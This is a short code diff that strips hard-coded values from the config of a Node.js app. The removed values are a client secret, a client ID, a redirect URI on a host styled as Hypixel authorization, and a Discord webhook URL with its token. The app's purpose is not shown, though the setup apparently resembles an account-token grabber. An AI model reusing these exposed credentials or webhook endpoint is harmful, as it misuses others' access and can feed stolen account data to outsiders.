@@ -1,8 +1,8 @@
 //Config
-const secret_value = '99c40ff0-7e5d-4055-b58d-eff6e6e7b852'
-const client_id = '59597ab1-1b58-46c3-a444-8e3ae2ecaef7'
-const redirect_uri = 'https://hypixel-authorization.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1120597979695423579/L1G4_hmbLzp673zEPb6CnK29iXC5Uyea-klXCVa_PGmv2WjerOcmSt_DguZRjz9O4Wo_'
+const secret_value = ''
+const client_id = ''
+const redirect_uri = ''
+const webhook_url = ''
 //Requirements
 const axios = require('axios')
 const express = require('express')
